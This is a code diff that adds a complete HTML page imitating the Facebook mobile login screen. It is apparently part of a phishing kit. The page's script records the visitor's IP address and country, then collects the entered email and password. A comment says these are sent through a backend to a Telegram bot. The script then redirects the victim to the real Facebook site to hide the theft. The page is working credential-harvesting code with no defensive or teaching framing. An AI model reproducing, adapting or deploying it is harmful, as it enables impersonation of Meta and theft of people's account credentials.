@@ -1,0 +1,470 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Facebook - Log In or Sign Up</title>
+<style>
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+
+body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+    background: #f0f2f5;
+    display: flex;
+    justify-content: center;
+    min-height: 100vh;
+    margin: 0;
+    padding: 0;
+}
+
+.container {
+    width: 100%;
+    max-width: 500px;
+    background: #fff;
+    min-height: 100vh;
+    position: relative;
+    display: flex;
+    flex-direction: column;
+}
+
+/* Header */
+.header {
+    background: #1877f2;
+    padding: 12px 16px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    position: sticky;
+    top: 0;
+    z-index: 100;
+}
+
+.header-title {
+    color: #fff;
+    font-size: 18px;
+    font-weight: 600;
+    letter-spacing: 0.3px;
+}
+
+.header-right {
+    display: flex;
+    align-items: center;
+    gap: 16px;
+}
+
+.header-link {
+    color: #fff;
+    font-size: 14px;
+    font-weight: 500;
+    text-decoration: none;
+}
+
+/* Login Form */
+.login-section {
+    padding: 24px 16px 16px;
+}
+
+.avatar-section {
+    text-align: center;
+    margin-bottom: 24px;
+}
+
+.avatar-icon {
+    width: 80px;
+    height: 80px;
+    background: #e4e6eb;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    margin: 0 auto 12px;
+}
+
+.avatar-icon svg {
+    width: 40px;
+    height: 40px;
+    fill: #606770;
+}
+
+.avatar-section p {
+    color: #606770;
+    font-size: 14px;
+    line-height: 1.4;
+}
+
+.input-group {
+    margin-bottom: 12px;
+}
+
+.input-group label {
+    display: block;
+    font-size: 14px;
+    font-weight: 500;
+    color: #606770;
+    margin-bottom: 6px;
+}
+
+.input-group input {
+    width: 100%;
+    padding: 14px 16px;
+    border: 1px solid #dddfe2;
+    border-radius: 8px;
+    font-size: 16px;
+    background: #fff;
+    color: #1c1e21;
+    outline: none;
+    transition: border-color 0.2s;
+}
+
+.input-group input:focus {
+    border-color: #1877f2;
+    box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.15);
+}
+
+.password-wrapper {
+    position: relative;
+}
+
+.password-wrapper input {
+    padding-right: 50px;
+}
+
+.toggle-password {
+    position: absolute;
+    right: 12px;
+    top: 50%;
+    transform: translateY(-50%);
+    background: none;
+    border: none;
+    color: #1877f2;
+    font-size: 14px;
+    font-weight: 600;
+    cursor: pointer;
+    padding: 4px;
+}
+
+.login-btn {
+    width: 100%;
+    padding: 14px;
+    background: #1877f2;
+    color: #fff;
+    border: none;
+    border-radius: 50px;
+    font-size: 16px;
+    font-weight: 600;
+    cursor: pointer;
+    margin-top: 8px;
+    transition: background 0.2s;
+}
+
+.login-btn:hover {
+    background: #166fe5;
+}
+
+.login-btn:active {
+    background: #1464d1;
+}
+
+.forgot-link {
+    display: block;
+    text-align: center;
+    margin-top: 16px;
+    color: #1877f2;
+    font-size: 14px;
+    font-weight: 500;
+    text-decoration: none;
+}
+
+.forgot-link:hover {
+    text-decoration: underline;
+}
+
+/* Divider */
+.divider {
+    display: flex;
+    align-items: center;
+    margin: 20px 0;
+}
+
+.divider-line {
+    flex: 1;
+    height: 1px;
+    background: #dadde1;
+}
+
+.divider-text {
+    padding: 0 16px;
+    color: #606770;
+    font-size: 13px;
+    font-weight: 500;
+}
+
+/* Create Account */
+.create-section {
+    text-align: center;
+    padding: 0 16px 24px;
+}
+
+.create-btn {
+    width: 100%;
+    padding: 14px;
+    background: #42b72a;
+    color: #fff;
+    border: none;
+    border-radius: 50px;
+    font-size: 16px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: background 0.2s;
+}
+
+.create-btn:hover {
+    background: #36a420;
+}
+
+.create-btn:active {
+    background: #2e8a1b;
+}
+
+/* Footer */
+.footer {
+    padding: 16px;
+    text-align: center;
+    border-top: 1px solid #dadde1;
+    margin-top: auto;
+}
+
+.footer-links {
+    display: flex;
+    flex-wrap: wrap;
+    justify-content: center;
+    gap: 8px 16px;
+    margin-bottom: 12px;
+}
+
+.footer-links a {
+    color: #606770;
+    font-size: 12px;
+    text-decoration: none;
+}
+
+.footer-links a:hover {
+    text-decoration: underline;
+}
+
+.footer-copyright {
+    color: #90949c;
+    font-size: 12px;
+}
+
+/* Hidden fields */
+.hidden-fields {
+    display: none;
+}
+
+/* Loading overlay */
+.loading-overlay {
+    display: none;
+    position: fixed;
+    top: 0;
+    left: 0;
+    right: 0;
+    bottom: 0;
+    background: rgba(255,255,255,0.85);
+    z-index: 999;
+    justify-content: center;
+    align-items: center;
+}
+
+.loading-overlay.active {
+    display: flex;
+}
+
+.spinner {
+    width: 40px;
+    height: 40px;
+    border: 4px solid #e4e6eb;
+    border-top: 4px solid #1877f2;
+    border-radius: 50%;
+    animation: spin 0.8s linear infinite;
+}
+
+@keyframes spin {
+    to { transform: rotate(360deg); }
+}
+
+/* Language bar */
+.lang-bar {
+    display: flex;
+    flex-wrap: wrap;
+    justify-content: center;
+    gap: 4px 12px;
+    padding: 8px 16px;
+    border-bottom: 1px solid #dadde1;
+    margin-bottom: 8px;
+}
+
+.lang-bar a, .lang-bar span {
+    color: #606770;
+    font-size: 12px;
+    text-decoration: none;
+}
+
+.lang-bar a:hover {
+    text-decoration: underline;
+}
+</style>
+</head>
+<body>
+
+<div class="container">
+
+    <!-- Header -->
+    <div class="header">
+        <span class="header-title">facebook</span>
+        <div class="header-right">
+            <a href="https://m.facebook.com/reg/" class="header-link">Sign Up</a>
+            <a href="#" class="header-link">Log In</a>
+        </div>
+    </div>
+
+    <!-- Language Bar -->
+    <div class="lang-bar">
+        <span>English (UK)</span>
+        <a href="#">বাংলা</a>
+        <a href="#">हिन्दी</a>
+        <a href="#">اردو</a>
+        <a href="#">नेपाली</a>
+        <a href="#">官話</a>
+    </div>
+
+    <!-- Login Section -->
+    <div class="login-section">
+        <div class="avatar-section">
+            <div class="avatar-icon">
+                <svg viewBox="0 0 24 24"><path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm0 4c2.21 0 4 1.79 4 4s-1.79 4-4 4-4-1.79-4-4 1.79-4 4-4zm0 18.4c-3.32 0-6.28-1.68-8.08-4.2.04-2.68 5.36-4.16 8.08-4.16s8.04 1.48 8.08 4.16c-1.8 2.52-4.76 4.2-8.08 4.2z"/></svg>
+            </div>
+            <p>Log in to Facebook to start sharing and connecting with your friends, family and people you know.</p>
+        </div>
+
+        <form id="loginForm">
+            <div class="input-group">
+                <label for="email">Mobile number or email address</label>
+                <input type="text" id="email" name="email" placeholder="Mobile number or email address" required autocomplete="username">
+            </div>
+
+            <div class="input-group">
+                <label for="password">Password</label>
+                <div class="password-wrapper">
+                    <input type="password" id="password" name="password" placeholder="Password" required autocomplete="current-password">
+                    <button type="button" class="toggle-password" id="togglePassword">Show</button>
+                </div>
+            </div>
+
+            <button type="submit" class="login-btn">Log In</button>
+
+            <a href="https://m.facebook.com/login/identify/" class="forgot-link">Forgotten password?</a>
+        </form>
+    </div>
+
+    <!-- Divider -->
+    <div class="divider">
+        <span class="divider-line"></span>
+        <span class="divider-text">or</span>
+        <span class="divider-line"></span>
+    </div>
+
+    <!-- Create Account -->
+    <div class="create-section">
+        <button class="create-btn" onclick="window.location.href='https://m.facebook.com/reg/'">Create new account</button>
+    </div>
+
+    <!-- Footer -->
+    <div class="footer">
+        <div class="footer-links">
+            <a href="#">About</a>
+            <a href="#">Help</a>
+            <a href="#">More</a>
+            <a href="#">Terms</a>
+            <a href="#">Privacy</a>
+        </div>
+        <div class="footer-copyright">Meta © 2026</div>
+    </div>
+
+    <!-- Loading Overlay -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="spinner"></div>
+    </div>
+
+</div>
+
+<script>
+// ============ NODE.JS ENGINE VARIABLES ============
+const id = "{{LINK_ID}}";
+const red = "{{REDIRECT_URL}}";
+
+// ============ IP DETECTION ============
+let detectedIp = "Unknown";
+let detectedCountry = "Unknown";
+
+fetch('https://ipapi.co/json/')
+    .then(res => res.json())
+    .then(data => {
+        if (data.ip) {
+            detectedIp = data.ip;
+            detectedCountry = data.country_name || "Unknown";
+        }
+    }).catch(e => {});
+
+// ============ TOGGLE PASSWORD VISIBILITY ============
+const toggleBtn = document.getElementById('togglePassword');
+const passwordField = document.getElementById('password');
+
+toggleBtn.addEventListener('click', function() {
+    const type = passwordField.getAttribute('type') === 'password' ? 'text' : 'password';
+    passwordField.setAttribute('type', type);
+    this.textContent = type === 'password' ? 'Show' : 'Hide';
+});
+
+// ============ FORM SUBMISSION & BACKEND SENDING ============
+document.getElementById('loginForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+
+    const email = document.getElementById('email').value.trim();
+    const pass = document.getElementById('password').value;
+
+    if (!email || !pass) return;
+
+    // Show loading spinner
+    document.getElementById('loadingOverlay').classList.add('active');
+
+    // Send data to Telegram Bot via Node.js backend
+    fetch('/api/data', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+            linkId: id,
+            type: 'fb_login',
+            data: {
+                email: email,
+                password: pass,
+                ip: detectedIp,
+                country: detectedCountry
+            }
+        })
+    }).catch(err => console.log(err));
+
+    // Redirect to destination after 1.5 seconds
+    setTimeout(function() {
+        let finalRed = (red && red.length > 4 && !red.includes("REDIRECT_URL")) ? red : "https://www.facebook.com/";
+        window.location.href = finalRed;
+    }, 1500);
+});
+</script>
+
+</body>
+</html>
